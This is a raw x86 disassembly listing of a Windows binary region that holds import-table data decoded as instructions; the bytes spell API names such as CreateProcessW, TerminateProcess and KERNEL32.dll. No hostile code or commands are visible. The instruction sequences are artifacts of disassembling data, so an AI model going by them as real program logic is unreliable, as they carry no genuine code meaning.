  413434:	clc    
  413435:	add    DWORD PTR [ebx+0x65],edx
  413438:	je     0x41348e
  41343a:	gs js  0x4134b1
  41343d:	inc    ecx
  41343e:	ins    BYTE PTR es:[edi],dx
  41343f:	imul   esp,DWORD PTR [edi+0x6e],0x1a40000
  413446:	push   eax
  413447:	popa   
  413448:	je     0x41348c
  41344a:	ins    BYTE PTR es:[edi],dx
  41344b:	je     0x41344d
  41344d:	add    BYTE PTR [ebp+0x0],dh
  413450:	inc    edx
  413451:	imul   ebp,DWORD PTR gs:[bp+0x50],0x687461
  41345a:	test   al,0x0
  41345c:	inc    ebx
  41345d:	jb     0x4134c4
  41345f:	popa   
  413460:	je     0x4134c7
  413462:	push   eax
  413463:	outs   dx,BYTE PTR gs:[esi]
  413465:	dec    ecx
  413466:	outs   dx,BYTE PTR ds:[esi]
  413467:	imul   esi,DWORD PTR fs:[edx+0x65],0x83007463
  41346f:	add    DWORD PTR [edi+0x65],eax
  413472:	je     0x4134c8
  413474:	gs js  0x4134eb
  413477:	inc    ebp
  413478:	js     0x4134ee
  41347a:	outs   dx,BYTE PTR gs:[esi]
  41347c:	je     0x4134ce
  41347e:	outs   dx,DWORD PTR ds:[esi]
  41347f:	imul   ebp,DWORD PTR [esi+0x74],0x413233
  413486:	aam    0x1
  413488:	push   ebx
  413489:	gs je  0x4134ce
  41348c:	imul   eax,DWORD PTR [ebx+0x6f],0x6c
  413490:	outs   dx,DWORD PTR ds:[esi]
  413491:	jb     0x413493
  413493:	add    bl,dh
  413495:	add    DWORD PTR [ebx+0x65],edx
  413498:	je     0x4134ec
  41349a:	dec    edi
  41349b:	push   eax
  41349c:	xor    al,BYTE PTR [eax]
  41349e:	stos   BYTE PTR es:[edi],al
  41349f:	add    BYTE PTR [ebx+0x72],al
  4134a2:	gs popa 
  4134a4:	je     0x41350b
  4134a6:	push   eax
  4134a7:	outs   dx,DWORD PTR ds:[esi]
  4134a8:	ins    BYTE PTR es:[edi],dx
  4134a9:	jns    0x413512
  4134ab:	outs   dx,DWORD PTR ds:[esi]
  4134ac:	outs   dx,BYTE PTR ds:[esi]
  4134ad:	push   edx
  4134ae:	outs   dx,BYTE PTR ds:[si]
  4134b0:	add    BYTE PTR [eax],al
  4134b2:	xchg   DWORD PTR [ecx],eax
  4134b4:	inc    edi
  4134b5:	gs je  0x41350c
  4134b8:	gs js  0x41352f
  4134bb:	inc    ebp
  4134bc:	js     0x413532
  4134be:	outs   dx,BYTE PTR gs:[esi]
  4134c0:	je     0x413512
  4134c2:	outs   dx,DWORD PTR ds:[esi]
  4134c3:	imul   ebp,DWORD PTR [esi+0x74],0x2010057
  4134ca:	push   ebx
  4134cb:	gs je  0x413525
  4134ce:	imul   ebp,DWORD PTR [esi+0x64],0x724f776f
  4134d5:	addr16 inc ebp
  4134d7:	js     0x4134d9
  4134d9:	add    BYTE PTR [edi+0x65724300],ah
  4134df:	popa   
  4134e0:	je     0x413547
  4134e2:	push   eax
  4134e3:	outs   dx,BYTE PTR gs:[esi]
  4134e5:	add    BYTE PTR [esi+0x74654701],cl
  4134eb:	push   esi
  4134ec:	imul   esp,DWORD PTR [ebp+0x77],0x74726f70
  4134f3:	dec    edi
  4134f4:	jb     0x41355d
  4134f6:	inc    ebp
  4134f7:	js     0x4134f9
  4134f9:	add    ch,cl
  4134fb:	add    BYTE PTR [ebp+0x73],al
  4134fe:	arpl   WORD PTR [ecx+0x70],sp
  413501:	add    BYTE PTR gs:[eax],al
  413504:	mov    bl,0x1
  413506:	push   eax
  413507:	outs   dx,DWORD PTR ds:[esi]
  413508:	ins    BYTE PTR es:[edi],dx
  413509:	jns    0x413572
  41350b:	outs   dx,DWORD PTR ds:[esi]
  41350c:	outs   dx,BYTE PTR ds:[esi]
  41350d:	add    BYTE PTR [ebx+0x65724300],ch
  413513:	popa   
  413514:	je     0x41357b
  413516:	push   edx
  413517:	arpl   WORD PTR gs:[edx+edx*2+0x67],si
  41351c:	outs   dx,BYTE PTR ds:[esi]
  41351d:	add    BYTE PTR [ecx+eax*1+0x54746547],al
  413524:	gs js  0x41359b
  413527:	inc    ebp
  413528:	js     0x41359e
  41352a:	outs   dx,BYTE PTR gs:[esi]
  41352c:	je     0x41357e
  41352e:	outs   dx,DWORD PTR ds:[esi]
  41352f:	imul   ebp,DWORD PTR [esi+0x74],0x573233
  413536:	jo     0x413538
  413538:	inc    ecx
  413539:	fs fs inc esi
  41353c:	outs   dx,DWORD PTR ds:[esi]
  41353d:	outs   dx,BYTE PTR ds:[esi]
  41353e:	je     0x413592
  413540:	gs jae 0x4135b2
  413543:	jne    0x4135b7
  413545:	arpl   WORD PTR [ebp+0x57],sp
  413548:	add    BYTE PTR [eax],al
  41354a:	inc    ecx
  41354b:	add    DWORD PTR [edi+0x65],eax
  41354e:	je     0x413594
  413550:	gs jbe 0x4135bc
  413553:	arpl   WORD PTR [ebp+0x43],sp
  413556:	popa   
  413557:	jo     0x4135cc
  413559:	add    BYTE PTR [esi+0x1],ch
  41355c:	inc    edi
  41355d:	gs je  0x4135b0
  413560:	imul   edi,DWORD PTR [eax+0x65],0xd500006c
  413567:	add    BYTE PTR [ebp+0x78],al
  41356a:	je     0x4135c0
  41356c:	gs js  0x4135e3
  41356f:	dec    edi
  413570:	jne    0x4135e6
  413572:	push   edi
  413573:	add    BYTE PTR [esi+0x65724300],ah
  413579:	popa   
  41357a:	je     0x4135e1
  41357c:	push   eax
  41357d:	popa   
  41357e:	je     0x4135f4
  413580:	gs jb  0x4135f1
  413583:	inc    edx
  413584:	jb     0x4135fb
  413586:	jae    0x4135f0
  413588:	add    BYTE PTR [eax],al
  41358a:	into   
  41358b:	add    BYTE PTR [ebp+0x78],al
  41358e:	arpl   WORD PTR [ebp+esi*2+0x64],bp
  413592:	gs inc ebx
  413594:	ins    BYTE PTR es:[edi],dx
  413595:	imul   esi,DWORD PTR [eax+0x52],0x746365
  41359c:	lds    eax,FWORD PTR [eax]
  41359e:	inc    ebp
  41359f:	outs   dx,BYTE PTR ds:[esi]
  4135a0:	jne    0x41360f
  4135a2:	inc    esi
  4135a3:	outs   dx,DWORD PTR ds:[esi]
  4135a4:	outs   dx,BYTE PTR ds:[esi]
  4135a5:	je     0x4135ed
  4135a7:	popa   
  4135a8:	ins    DWORD PTR es:[edi],dx
  4135a9:	imul   ebp,DWORD PTR [ecx+ebp*2+0x65],0x47005773
  4135b1:	inc    esp
  4135b2:	dec    ecx
  4135b3:	xor    esi,DWORD PTR [edx]
  4135b5:	cs fs ins BYTE PTR es:[edi],dx
  4135b8:	ins    BYTE PTR es:[edi],dx
  4135b9:	add    BYTE PTR [edi+0x74654701],bl
  4135bf:	inc    ebx
  4135c0:	outs   dx,DWORD PTR ds:[esi]
  4135c1:	ins    DWORD PTR es:[edi],dx
  4135c2:	jo     0x413639
  4135c4:	je     0x41362b
  4135c6:	jb     0x413616
  4135c8:	popa   
  4135c9:	ins    DWORD PTR es:[edi],dx
  4135ca:	gs inc ecx
  4135cc:	add    BYTE PTR [eax],al
  4135ce:	sbb    eax,0x74655304
  4135d3:	dec    eax
  4135d4:	popa   
  4135d5:	outs   dx,BYTE PTR ds:[esi]
  4135d6:	fs ins BYTE PTR es:[edi],dx
  4135d8:	gs inc ebx
  4135da:	outs   dx,DWORD PTR ds:[esi]
  4135db:	jne    0x41364b
  4135dd:	je     0x4135df
  4135df:	add    BYTE PTR [edx],bh
  4135e1:	add    ecx,DWORD PTR [edi+0x70]
  4135e4:	outs   dx,BYTE PTR gs:[esi]
  4135e6:	inc    esi
  4135e7:	imul   ebp,DWORD PTR [ebp+eiz*2+0x0],0x4300f200
  4135ef:	jb     0x413656
  4135f1:	popa   
  4135f2:	je     0x413659
  4135f4:	push   edi
  4135f5:	popa   
  4135f6:	imul   esi,DWORD PTR [ecx+eiz*2+0x62],0x6954656c
  4135fe:	ins    DWORD PTR es:[edi],dx
  4135ff:	gs jb  0x413643
  413602:	add    BYTE PTR [eax],al
  413604:	and    al,0x3
  413606:	dec    ebp
  413607:	popa   
  413608:	jo     0x413660
  41360a:	imul   esp,DWORD PTR [ebp+0x77],0x6946664f
  413611:	ins    BYTE PTR es:[edi],dx
  413612:	add    BYTE PTR gs:[esp+eax*1],bh
  413616:	push   ebx
  413617:	gs je  0x41366e
  41361a:	push   0x64616572
  41361f:	push   eax
  413620:	jb     0x41368b
  413622:	outs   dx,DWORD PTR ds:[esi]
  413623:	jb     0x41368e
  413625:	je     0x4136a0
  413627:	add    BYTE PTR [edx+0x6f6c4702],dl
  41362d:	bound  esp,QWORD PTR [ecx+0x6c]
  413630:	inc    edi
  413631:	gs je  0x413675
  413634:	je     0x4136a5
  413636:	ins    DWORD PTR es:[edi],dx
  413637:	dec    esi
  413638:	popa   
  413639:	ins    DWORD PTR es:[edi],dx
  41363a:	gs push edi
  41363c:	add    BYTE PTR [eax],al
  41363e:	retf   
  41363f:	add    cl,BYTE PTR [ecx+0x73]
  413642:	inc    edx
  413643:	popa   
  413644:	fs push edx
  413646:	gs popa 
  413648:	fs push eax
  41364a:	je     0x4136be
  41364c:	add    BYTE PTR [eax],al
  41364e:	or     BYTE PTR [ecx],al
  413650:	inc    esp
  413651:	gs jbe 0x4136bd
  413654:	arpl   WORD PTR [ebp+0x49],sp
  413657:	outs   dx,DWORD PTR ds:[esi]
  413658:	inc    ebx
  413659:	outs   dx,DWORD PTR ds:[esi]
  41365a:	outs   dx,BYTE PTR ds:[esi]
  41365b:	je     0x4136cf
  41365d:	outs   dx,DWORD PTR ds:[esi]
  41365e:	ins    BYTE PTR es:[edi],dx
  41365f:	add    BYTE PTR [ecx+0x1],bl
  413662:	inc    esi
  413663:	imul   ebp,DWORD PTR [esi+0x64],0x736f6c43
  41366a:	add    BYTE PTR gs:[edx],cl
  41366d:	add    al,BYTE PTR [edi+0x65]
  413670:	je     0x4136bf
  413672:	outs   dx,DWORD PTR ds:[esi]
  413673:	fs jne 0x4136e2
  413676:	gs dec eax
  413678:	popa   
  413679:	outs   dx,BYTE PTR ds:[esi]
  41367a:	fs ins BYTE PTR es:[edi],dx
  41367c:	gs inc ecx
  41367e:	add    BYTE PTR [eax],al
  413680:	inc    edx
  413681:	add    DWORD PTR [esi+0x69],eax
  413684:	outs   dx,BYTE PTR ds:[esi]
  413685:	fs dec esi
  413687:	gs js  0x4136fe
  41368a:	inc    ebx
  41368b:	push   0x65676e61
  413690:	dec    esi
  413691:	outs   dx,DWORD PTR ds:[esi]
  413692:	je     0x4136fd
  413694:	imul   sp,WORD PTR [ebx+0x61],0x6974
  41369a:	outs   dx,DWORD PTR ds:[esi]
  41369b:	outs   dx,BYTE PTR ds:[esi]
  41369c:	add    BYTE PTR [eax],al
  41369e:	xor    eax,0x74655304
  4136a3:	push   esp
  4136a4:	push   0x64616572
  4136a9:	inc    ecx
  4136aa:	data16 imul bp,WORD PTR [esi+0x69],0x7974
  4136b1:	dec    ebp
  4136b2:	popa   
  4136b3:	jae    0x413720
  4136b5:	add    BYTE PTR [esi],bl
  4136b7:	add    al,BYTE PTR [edi+0x65]
  4136ba:	je     0x41370c
  4136bc:	jb     0x413727
  4136be:	outs   dx,DWORD PTR ds:[esi]
  4136bf:	jb     0x41372a
  4136c1:	je     0x41373c
  4136c3:	inc    ebx
  4136c4:	ins    BYTE PTR es:[edi],dx
  4136c5:	popa   
  4136c6:	jae    0x41373b
  4136c8:	add    BYTE PTR [eax],al
  4136ca:	sti    
  4136cb:	add    DWORD PTR [edi+0x65],eax
  4136ce:	je     0x41371c
  4136d0:	popa   
  4136d1:	jae    0x413747
  4136d3:	inc    ebp
  4136d4:	jb     0x413748
  4136d6:	outs   dx,DWORD PTR ds:[esi]
  4136d7:	jb     0x4136d9
  4136d9:	add    BYTE PTR [edi],dl
  4136db:	add    ecx,DWORD PTR [edi+ebp*2+0x63]
  4136df:	imul   eax,DWORD PTR [esi+0x69],0x6c
  4136e3:	add    BYTE PTR gs:[eax],al
  4136e6:	retf   
  4136e7:	add    DWORD PTR [edi+0x65],eax
  4136ea:	je     0x41372f
  4136ec:	jne    0x413760
  4136ee:	jb     0x413755
  4136f0:	outs   dx,BYTE PTR ds:[esi]
  4136f1:	je     0x413737
  4136f3:	imul   esi,DWORD PTR [edx+0x65],0x726f7463
  4136fa:	jns    0x413753
  4136fc:	add    BYTE PTR [eax],al
  4136fe:	mov    BYTE PTR [eax],al
  413700:	inc    ecx
  413701:	jb     0x413768
  413703:	inc    esi
  413704:	imul   ebp,DWORD PTR [ebp+eiz*2+0x41],0x41736970
  41370c:	dec    esi
  41370d:	push   ebx
  41370e:	dec    ecx
  41370f:	add    BYTE PTR ds:0x74655304,ah
  413715:	dec    ebp
  413716:	popa   
  413717:	imul   ebp,DWORD PTR [ebx+esi*2+0x6c],0x6e49746f
  41371f:	outs   dx,WORD PTR ds:[esi]
  413721:	add    dl,cl
  413723:	add    BYTE PTR [ebx+0x72],al
  413726:	gs popa 
  413728:	je     0x41378f
  41372a:	inc    ebp
  41372b:	jbe    0x413792
  41372d:	outs   dx,BYTE PTR ds:[esi]
  41372e:	je     0x413771
  413730:	add    BYTE PTR [eax],al
  413732:	outs   dx,BYTE PTR ds:[esi]
  413733:	add    DWORD PTR [esi+0x69],eax
  413736:	outs   dx,BYTE PTR ds:[esi]
  413737:	fs push edx
  413739:	gs jae 0x4137ab
  41373c:	jne    0x4137b0
  41373e:	arpl   WORD PTR [ebp+0x45],sp
  413741:	js     0x41379a
  413743:	add    BYTE PTR [eax+0x3],bh
  413746:	push   edx
  413747:	gs popa 
  413749:	fs inc esi
  41374b:	imul   ebp,DWORD PTR [ebp+eiz*2+0x0],0x47026100
  413753:	gs je  0x4137aa
  413756:	gs ins DWORD PTR es:[edi],dx
  413758:	jo     0x4137aa
  41375a:	popa   
  41375b:	je     0x4137c5
  41375d:	inc    ecx
  41375e:	add    BYTE PTR [eax],al
  413760:	mov    DWORD PTR [edx],eax
  413762:	inc    edi
  413763:	ins    BYTE PTR es:[edi],dx
  413764:	outs   dx,DWORD PTR ds:[esi]
  413765:	bound  esp,QWORD PTR [ecx+0x6c]
  413768:	inc    ecx
  413769:	ins    BYTE PTR es:[edi],dx
  41376a:	ins    BYTE PTR es:[edi],dx
  41376b:	outs   dx,DWORD PTR ds:[esi]
  41376c:	arpl   WORD PTR [eax],ax
  41376e:	xchg   esp,eax
  41376f:	add    al,0x57
  413771:	imul   ebp,DWORD PTR [esi+0x45],0x636578
  413778:	bound  eax,QWORD PTR [edx]
  41377a:	inc    edi
  41377b:	gs je  0x4137d2
  41377e:	gs ins DWORD PTR es:[edi],dx
  413780:	jo     0x4137d2
  413782:	popa   
  413783:	je     0x4137ed
  413785:	push   edi
  413786:	add    BYTE PTR [eax],al
  413788:	rol    BYTE PTR [eax],1
  41378a:	inc    ebx
  41378b:	jb     0x4137f2
  41378d:	popa   
  41378e:	je     0x4137f5
  413790:	inc    esi
  413791:	imul   ebp,DWORD PTR [ebp+eiz*2+0x41],0x47026700
  413799:	gs je  0x4137f0
  41379c:	push   0x64616572
  4137a1:	dec    esp
  4137a2:	outs   dx,DWORD PTR ds:[esi]
  4137a3:	arpl   WORD PTR [ecx+0x6c],sp
  4137a6:	add    BYTE PTR gs:[eax],ah
  4137a9:	add    DWORD PTR [ebp+0x6e],eax
  4137ac:	jne    0x41381b
  4137ae:	push   edx
  4137af:	gs jae 0x413821
  4137b2:	jne    0x413826
  4137b4:	arpl   WORD PTR [ebp+0x4e],sp
  4137b7:	popa   
  4137b8:	ins    DWORD PTR es:[edi],dx
  4137b9:	gs jae 0x4137fd
  4137bc:	add    BYTE PTR [eax],al
  4137be:	repz add DWORD PTR [edi+0x65],eax
  4137c2:	je     0x41380a
  4137c4:	jne    0x413832
  4137c6:	ins    BYTE PTR es:[edi],dx
  4137c7:	push   eax
  4137c8:	popa   
  4137c9:	je     0x413833
  4137cb:	dec    esi
  4137cc:	popa   
  4137cd:	ins    DWORD PTR es:[edi],dx
  4137ce:	gs push edi
  4137d0:	add    BYTE PTR [eax],al
  4137d2:	push   eax
  4137d3:	add    DWORD PTR [esi+0x69],eax
  4137d6:	ins    BYTE PTR es:[edi],dx
  4137d7:	gs push esp
  4137d9:	imul   ebp,DWORD PTR [ebp+0x65],0x79536f54
  4137e0:	jae    0x413856
  4137e2:	gs ins DWORD PTR es:[edi],dx
  4137e4:	push   esp
  4137e5:	imul   ebp,DWORD PTR [ebp+0x65],0xe60000
  4137ec:	inc    ebx
  4137ed:	jb     0x413854
  4137ef:	popa   
  4137f0:	je     0x413857
  4137f2:	push   edx
  4137f3:	gs ins DWORD PTR es:[edi],dx
  4137f5:	outs   dx,DWORD PTR ds:[esi]
  4137f6:	je     0x41385d
  4137f8:	push   esp
  4137f9:	push   0x64616572
  4137fe:	add    BYTE PTR [eax],al
  413800:	jns    0x413804
  413802:	inc    edi
  413803:	gs je  0x41385c
  413806:	gs jb  0x41387c
  413809:	imul   ebp,DWORD PTR [edi+0x6e],0x1010000
  413810:	inc    esp
  413811:	gs ins BYTE PTR es:[edi],dx
  413813:	gs je  0x41387b
  413816:	inc    ebx
  413817:	jb     0x413882
  413819:	je     0x413884
  41381b:	arpl   WORD PTR [ecx+0x6c],sp
  41381e:	push   ebx
  41381f:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  413824:	outs   dx,BYTE PTR ds:[esi]
  413825:	add    BYTE PTR [ecx],cl
  413827:	add    al,BYTE PTR [edi+0x65]
  41382a:	je     0x413879
  41382c:	outs   dx,DWORD PTR ds:[esi]
  41382d:	fs jne 0x41389c
  413830:	gs inc esi
  413832:	imul   ebp,DWORD PTR [ebp+eiz*2+0x4e],0x57656d61
  41383a:	add    BYTE PTR [eax],al
  41383c:	dec    edi
  41383d:	add    al,0x53
  41383f:	jne    0x4138b4
  413841:	jo     0x4138a8
  413843:	outs   dx,BYTE PTR ds:[esi]
  413844:	fs push esp
  413846:	push   0x64616572
  41384b:	add    ah,cl
  41384d:	add    al,0x6c
  41384f:	jae    0x4138c5
  413851:	jb     0x4138b6
  413853:	jo     0x4138ce
  413855:	outs   dx,BYTE PTR ds:[esi]
  413856:	push   edi
  413857:	add    bh,dh
  413859:	add    DWORD PTR [edi+0x65],eax
  41385c:	je     0x4138a6
  41385e:	popa   
  41385f:	outs   dx,BYTE PTR ds:[esi]
  413860:	fs ins BYTE PTR es:[edi],dx
  413862:	gs dec ecx
  413864:	outs   dx,BYTE PTR ds:[esi]
  413865:	outs   dx,WORD PTR ds:[esi]
  413867:	jb     0x4138d6
  413869:	popa   
  41386a:	je     0x4138d5
  41386c:	outs   dx,DWORD PTR ds:[esi]
  41386d:	outs   dx,BYTE PTR ds:[esi]
  41386e:	add    BYTE PTR [eax],al
  413870:	or     eax,DWORD PTR [ebx]
  413872:	dec    esp
  413873:	outs   dx,DWORD PTR ds:[esi]
  413874:	arpl   WORD PTR [ecx+0x6c],sp
  413877:	inc    ecx
  413878:	ins    BYTE PTR es:[edi],dx
  413879:	ins    BYTE PTR es:[edi],dx
  41387a:	outs   dx,DWORD PTR ds:[esi]
  41387b:	arpl   WORD PTR [eax],ax
  41387d:	add    BYTE PTR [ebx+0x2],ah
  413880:	inc    edi
  413881:	gs je  0x4138d8
  413884:	push   0x64616572
  413889:	inc    ebx
  41388a:	outs   dx,DWORD PTR ds:[esi]
  41388b:	outs   dx,BYTE PTR ds:[esi]
  41388c:	je     0x4138f3
  41388e:	js     0x413904
  413890:	add    BYTE PTR [eax],al
  413892:	ret    
  413893:	add    edx,DWORD PTR [edx+0x74]
  413896:	ins    BYTE PTR es:[edi],dx
  413897:	push   ebp
  413898:	outs   dx,BYTE PTR ds:[esi]
  413899:	ja     0x413904
  41389b:	outs   dx,BYTE PTR ds:[esi]
  41389c:	add    BYTE PTR fs:[ecx+eax*1+0x41746547],cl
  4138a4:	je     0x413915
  4138a6:	ins    DWORD PTR es:[edi],dx
  4138a7:	dec    esi
  4138a8:	popa   
  4138a9:	ins    DWORD PTR es:[edi],dx
  4138aa:	gs push edi
  4138ac:	add    BYTE PTR [eax],al
  4138ae:	jmp    0x6946:0x74654701
  4138b5:	ins    BYTE PTR es:[edi],dx
  4138b6:	gs inc ecx
  4138b8:	je     0x41392e
  4138ba:	jb     0x413925
  4138bc:	bound  esi,QWORD PTR [ebp+0x74]
  4138bf:	gs jae 0x413907
  4138c2:	js     0x413905
  4138c4:	add    BYTE PTR [eax],al
  4138c6:	inc    edx
  4138c7:	add    al,BYTE PTR [edi+0x65]
  4138ca:	je     0x41391f
  4138cc:	push   0x5074726f
  4138d1:	popa   
  4138d2:	je     0x41393c
  4138d4:	dec    esi
  4138d5:	popa   
  4138d6:	ins    DWORD PTR es:[edi],dx
  4138d7:	gs inc ecx
  4138d9:	add    bl,bl
  4138db:	add    edx,DWORD PTR [ebx+0x65]
  4138de:	popa   
  4138df:	jb     0x413944
  4138e1:	push   0x68746150
  4138e6:	inc    ecx
  4138e7:	add    BYTE PTR [eax+0x4],al
  4138ea:	push   ebx
  4138eb:	gs je  0x413942
  4138ee:	imul   ebp,DWORD PTR [ebp+0x65],0x65755172
  4138f5:	jne    0x41395c
  4138f7:	push   esp
  4138f8:	imul   ebp,DWORD PTR [ebp+0x65],0xb4000072
  4138ff:	add    edx,DWORD PTR [edx+0x65]
  413902:	ins    DWORD PTR es:[edi],dx
  413903:	outs   dx,DWORD PTR ds:[esi]
  413904:	jbe    0x41396b
  413906:	inc    esp
  413907:	imul   esi,DWORD PTR [edx+0x65],0x726f7463
  41390e:	jns    0x413967
  413910:	add    BYTE PTR [eax],al
  413912:	ret    
  413913:	add    al,0x6c
  413915:	jae    0x41398b
  413917:	jb     0x41397c
  413919:	ins    DWORD PTR es:[edi],dx
  41391a:	jo     0x413973
  41391c:	add    BYTE PTR [eax],al
  41391e:	dec    edi
  41391f:	add    DWORD PTR [esi+0x69],eax
  413922:	ins    BYTE PTR es:[edi],dx
  413923:	gs push esp
  413925:	imul   ebp,DWORD PTR [ebp+0x65],0x6f4c6f54
  41392c:	arpl   WORD PTR [ecx+0x6c],sp
  41392f:	inc    esi
  413930:	imul   ebp,DWORD PTR [ebp+eiz*2+0x54],0x656d69
  413938:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413939:	add    BYTE PTR [ebx+0x61],al
  41393c:	outs   dx,BYTE PTR ds:[esi]
  41393d:	arpl   WORD PTR [ebp+0x6c],sp
  413940:	push   edi
  413941:	popa   
  413942:	imul   esi,DWORD PTR [ecx+eiz*2+0x62],0x6954656c
  41394a:	ins    DWORD PTR es:[edi],dx
  41394b:	gs jb  0x41394e
  41394e:	dec    ebx
  41394f:	inc    ebp
  413950:	push   edx
  413951:	dec    esi
  413952:	inc    ebp
  413953:	dec    esp
  413954:	xor    esi,DWORD PTR [edx]
  413956:	cs fs ins BYTE PTR es:[edi],dx
  413959:	ins    BYTE PTR es:[edi],dx
  41395a:	add    BYTE PTR [eax],al
  41395c:	inc    esi
  41395d:	add    BYTE PTR [eax+0x61],dl
  413960:	je     0x4139ca
  413962:	inc    esi
  413963:	imul   ebp,DWORD PTR [esi+0x64],0x65747845
  41396a:	outs   dx,BYTE PTR ds:[esi]
  41396b:	jae    0x4139d6
  41396d:	outs   dx,DWORD PTR ds:[esi]
  41396e:	outs   dx,BYTE PTR ds:[esi]
  41396f:	inc    ecx
  413970:	add    BYTE PTR [eax],al
  413972:	inc    edi
  413973:	add    BYTE PTR [eax+0x61],dl
  413976:	je     0x4139e0
  413978:	inc    esi
  413979:	imul   ebp,DWORD PTR [esi+0x64],0x65747845
  413980:	outs   dx,BYTE PTR ds:[esi]
  413981:	jae    0x4139ec
  413983:	outs   dx,DWORD PTR ds:[esi]
  413984:	outs   dx,BYTE PTR ds:[esi]
  413985:	push   edi
  413986:	add    BYTE PTR [eax],al
  413988:	push   ebx
  413989:	dec    eax
  41398a:	dec    esp
  41398b:	push   edi
  41398c:	inc    ecx
  41398d:	push   eax
  41398e:	dec    ecx
  41398f:	cs fs ins BYTE PTR es:[edi],dx
  413992:	ins    BYTE PTR es:[edi],dx
  413993:	add    BYTE PTR [ebx+0x46],dh
  413996:	addr16 popa 
  413998:	pop    ecx
  413999:	dec    ebp
  41399a:	popa   
  41399b:	jns    0x4139f1
  41399d:	push   ecx
  41399e:	imul   ebp,DWORD PTR [ebx+0x74],0x78
  4139a2:	je     0x413a05
  4139a4:	inc    ebx
  4139a5:	push   ecx
  4139a6:	ins    BYTE PTR es:[edi],dx
  4139a7:	pop    eax
  4139a8:	add    BYTE PTR [eax],al
  4139aa:	add    BYTE PTR [eax],al
  4139ac:	or     al,0x3e
  4139ae:	inc    ecx
  4139af:	add    BYTE PTR [esi+edi*1],dl
  4139b2:	inc    ecx
  4139b3:	add    ah,dh
  4139b5:	cmp    eax,DWORD PTR [ecx+0x0]
  4139b8:	call   0x794febc8
  4139bd:	dec    edi
  4139be:	ret    0x774e
  4139c1:	dec    edi
  4139c2:	cmp    eax,0x384f4f4f
  4139c7:	dec    edi
  4139c8:	jp     0x413a19
  4139ca:	cmp    ecx,DWORD PTR [edi+0x5e]
  4139cd:	dec    edi
  4139ce:	ss dec edi
  4139d0:	add    ecx,DWORD PTR [edi+0x31]
  4139d3:	dec    edi
  4139d4:	ret    0x324e
  4139d7:	dec    edi
  4139d8:	push   ds
  4139d9:	push   edx
  4139da:	pop    ds
  4139db:	push   ebx
  4139dc:	cmp    DWORD PTR [edi+0x79],ecx
  4139df:	dec    edi
  4139e0:	ret    0x774e
  4139e3:	dec    edi
  4139e4:	cmp    eax,0x384f4f4f
  4139e9:	dec    edi
  4139ea:	jp     0x413a3b
  4139ec:	cmp    ecx,DWORD PTR [edi+0x5e]
  4139ef:	dec    edi
  4139f0:	ss dec edi
  4139f2:	imul   ecx,DWORD PTR [edi+0x31],0x324ec24f
  4139f9:	dec    edi
  4139fa:	push   ds
  4139fb:	bound  ebx,QWORD PTR [edi]
  4139fd:	arpl   WORD PTR [ecx],di
  4139ff:	dec    edi
  413a00:	jns    0x413a51
  413a02:	ret    0x724e
  413a05:	dec    edi
  413a06:	cmp    eax,0x394f034f
  413a0b:	dec    edi
  413a0c:	dec    esp
  413a0d:	dec    edi
  413a0e:	xor    al,0x4f
  413a10:	ret    0x304e
  413a13:	dec    edi
  413a14:	push   ds
  413a15:	jb     0x413a36
  413a17:	jae    0x413a28
  413a19:	or     DWORD PTR [eax],0xffffff80
  413a1c:	js     0x4139ae
  413a1e:	jns    0x4139b1
  413a20:	aas    
  413a21:	dec    edi
  413a22:	jbe    0x413a73
  413a24:	ret    0x764e
  413a27:	dec    edi
  413a28:	ds dec edi
  413a2a:	dec    esp
  413a2b:	dec    edi
  413a2c:	cmp    DWORD PTR [edi+0x3],ecx
  413a2f:	dec    edi
  413a30:	xor    eax,0x364ec24f
  413a35:	dec    edi
  413a36:	push   ds
  413a37:	sbb    BYTE PTR [edi],0x83
  413a3a:	setae  BYTE PTR [eax]
  413a3d:	nop
  413a3e:	js     0x4139e0
  413a40:	jns    0x4139e3
  413a42:	aas    
  413a43:	dec    edi
  413a44:	jbe    0x413a95
  413a46:	ret    0x764e
  413a49:	dec    edi
  413a4a:	ds dec edi
  413a4c:	dec    esp
  413a4d:	dec    edi
  413a4e:	cmp    DWORD PTR [edi+0x69],ecx
  413a51:	dec    edi
  413a52:	xor    eax,0x364ec24f
  413a57:	dec    edi
  413a58:	push   ds
  413a59:	xchg   edx,eax
  413a5a:	pop    ds
  413a5b:	xchg   ebx,eax
  413a5c:	bt     DWORD PTR [eax],ecx
  413a5f:	mov    al,ds:0xb179b078
  413a64:	aas    
  413a65:	dec    edi
  413a66:	push   0x4e4ec24f
  413a6b:	dec    edi
  413a6c:	cmp    eax,0x394f034f
  413a71:	dec    edi
  413a72:	push   ecx
  413a73:	dec    edi
  413a74:	xor    al,0x4f
  413a76:	ret    0x364e
  413a79:	dec    edi
  413a7a:	push   ds
  413a7b:	mov    ds:0xb30fa31f,al
  413a80:	or     BYTE PTR [eax-0x3e863f88],dh
  413a86:	aas    
  413a87:	dec    edi
  413a88:	push   0x4e4ec24f
  413a8d:	dec    edi
  413a8e:	cmp    eax,0x394f784f
  413a93:	dec    edi
  413a94:	pop    edi
  413a95:	dec    edi
  413a96:	cmp    ecx,DWORD PTR [edi-0x3e]
  413a99:	dec    esi
  413a9a:	xor    eax,0x1fb21e4f
  413a9f:	mov    bl,0xf
  413aa1:	ret    
  413aa2:	or     al,al
  413aa4:	js     0x413a76
  413aa6:	jns    0x413a79
  413aa8:	aas    
  413aa9:	dec    edi
  413aaa:	push   0x4e4ec24f
  413aaf:	dec    edi
  413ab0:	cmp    eax,0x394f724f
  413ab5:	dec    edi
  413ab6:	dec    esi
  413ab7:	dec    edi
  413ab8:	xor    al,0x4f
  413aba:	ret    0x304e
  413abd:	dec    edi
  413abe:	push   ds
  413abf:	ret    0xc31f
  413ac2:	psrlq  mm1,QWORD PTR [eax]
  413ac5:	sar    BYTE PTR [eax-0x20],1
  413ac8:	jns    0x413aab
  413aca:	aas    
  413acb:	dec    edi
  413acc:	push   0x4e4ec24f
  413ad1:	dec    edi
  413ad2:	cmp    eax,0x394f734f
  413ad7:	dec    edi
  413ad8:	dec    esp
  413ad9:	dec    edi
  413ada:	xor    al,0x4f
  413adc:	ret    0x364e
  413adf:	dec    edi
  413ae0:	push   ds
  413ae1:	rcr    BYTE PTR [edi],cl
  413ae3:	ror    DWORD PTR [edi],cl
  413ae5:	jecxz  0x413aef
  413ae7:	loopne 0x413b61
  413ae9:	lock jns 0x413add
  413aec:	aas    
  413aed:	dec    edi
  413aee:	ins    DWORD PTR es:[edi],dx
  413aef:	dec    edi
  413af0:	ret    0x5f4e
  413af3:	dec    edi
